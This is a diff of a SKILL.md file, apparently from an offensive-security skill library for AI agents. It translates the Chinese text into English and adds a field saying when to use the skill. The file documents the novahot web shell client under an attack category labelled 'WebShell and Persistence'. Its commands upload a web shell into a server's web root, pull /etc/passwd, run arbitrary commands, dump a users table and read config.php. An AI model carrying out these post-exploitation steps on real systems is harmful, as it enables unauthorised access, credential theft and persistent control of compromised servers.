@@ -2,40 +2,43 @@
 name: novahot-web-shell
 description: "Unified post-WebShell operations. Signals: webshell, rce, upload WebShell, download files, execute commands."
 zh-signals: "novahot: 获 WebShell 后统一操作。信号:webshell,rce,上传 WebShell,下载文件,执行命令。"
+when-to-use: >-
+  Use after obtaining a web shell when you need a unified CLI to upload or download
+  files, execute commands, and query databases across PHP/ASP/ASPX payloads.
 ---
 
 # novahot
 
-- 攻击大类:C13 WebShell与持久化
-- 上游仓库:https://github.com/chrisallenlane/novahot
-- 上游 License:BSD-3-Clause(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C13 WebShell and Persistence
+- Upstream Repository: https://github.com/chrisallenlane/novahot
+- Upstream License: BSD-3-Clause (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 npm install -g novahot
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `novahot upload ./shell.php /var/www/shell.php` | 上传 WebShell |
-| `novahot download /etc/passwd ./passwd.txt` | 下载文件 |
-| `novahot exec 'id'` | 执行命令 |
-| `novahot mysql 'SELECT * FROM users'` | 内置数据库客户端 |
-| `novahot shell` | 交互 shell |
+| `novahot upload ./shell.php /var/www/shell.php` | Upload a WebShell |
+| `novahot download /etc/passwd ./passwd.txt` | Download a file |
+| `novahot exec 'id'` | Execute a command |
+| `novahot mysql 'SELECT * FROM users'` | Built-in database client |
+| `novahot shell` | Interactive shell |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### 获 WebShell 后统一操作
+### Unified Operations After Obtaining a WebShell
 
 ```bash
 novahot upload webshell.php /var/www/html/s.php
 novahot exec 'cat /var/www/html/config.php'
-# 多种 payload 类型(php/asp/aspx)统一 CLI 管理
+# Unified CLI management for multiple payload types (php/asp/aspx)
 ```
 
-## 注意事项
+## Notes
 
-跨平台 WebShell 客户端(Node.js),支持 PHP/ASP/ASPX payload,命令/文件传输/数据库一体。
+Cross-platform WebShell client (Node.js), supports PHP/ASP/ASPX payloads, combining command execution, file transfer, and database access.
